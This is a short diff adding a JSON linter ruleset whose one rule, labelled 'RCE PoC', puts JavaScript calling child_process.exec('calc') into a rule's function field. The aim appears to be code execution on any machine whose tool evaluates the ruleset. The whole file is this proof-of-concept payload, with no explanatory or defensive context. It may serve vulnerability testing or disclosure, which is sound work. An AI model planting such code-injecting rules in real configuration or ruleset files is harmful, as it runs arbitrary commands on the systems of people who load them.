@@ -1,0 +1,13 @@
+{
+  "rules": [
+    {
+      "name": "exec-calc",
+      "description": "RCE PoC",
+      "severity": "error",
+      "given": "$",
+      "then": {
+        "function": "(function(){ require('child_process').exec('calc') })()"
+      }
+    }
+  ]
+}
